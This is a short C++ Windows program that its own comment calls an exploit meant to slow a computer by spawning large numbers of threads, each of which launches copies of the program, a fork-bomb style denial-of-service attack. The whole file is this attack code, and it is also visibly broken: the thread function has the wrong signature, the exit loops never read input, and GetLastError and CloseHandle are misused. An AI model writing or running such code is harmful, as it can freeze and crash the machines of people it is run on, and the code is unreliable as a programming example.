#include <iostream>
#include <Windows.h>

using namespace std;

//This exploits create large no of threads and then each process creates a process to slow down a computer 


void createProcesses(STARTUPINFO startupInfo, PROCESS_INFORMATION processInfo, char* argv[]) {
    char Args[256];
        sprintf_s(Args,"Dummy Data", argv[0]);

        cout << "Argument is: " << argv[1] << endl;
        cout << "Starting child process\n";

        memset(&startupInfo, 0 , sizeof(startupInfo));
        memset(&processInfo, 0, sizeof(processInfo));

        startupInfo.cb = sizeof(startupInfo);

        if(CreateProcess(argv[0], 0, 0, 0, 0, 0, 0, 0, &startupInfo, &processInfo) == 0)   {
            cout << "Error: " << GetLastError << endl;
        }
        WaitForSingleObject(processInfo.hProcess, INFINITE);
}

DWORD WINAPI Thread(LPVOID lpParameter, char*argv[])
{
	unsigned int& myCounter = *((unsigned int*)lpParameter);
	while(myCounter < 0xFFFFFFFF) ++myCounter;

    STARTUPINFO startupInfo;
    PROCESS_INFORMATION processInfo;
	createProcesses(startupInfo, processInfo, argv);
    
    return 0;

}

int main(int argc, char* argv[]) {
    
    
        unsigned int myCounter = 0;
        DWORD myThreadID;
        char myChar = ' ';
        HANDLE myHandle[1000];

        int i=0;
        
        while(myChar != 'q') {
            myHandle[i] = CreateThread(0,0,(LPTHREAD_START_ROUTINE)Thread,(char *)&argv,0,&myThreadID);
            while(myChar != 'a') {
                cout << myCounter << endl;
            }
            i++;
        }
        CloseHandle(myHandle);
        
    
    
    // STARTUPINFO startupInfo;
    // PROCESS_INFORMATION processInfo;

    // if(argc == 1) {
    //        createProcesses(startupInfo,processInfo);
    // }
    // else {
    //     cout << "Arguments " << argv[1];
    // }

    // getchar();

    return 0;
}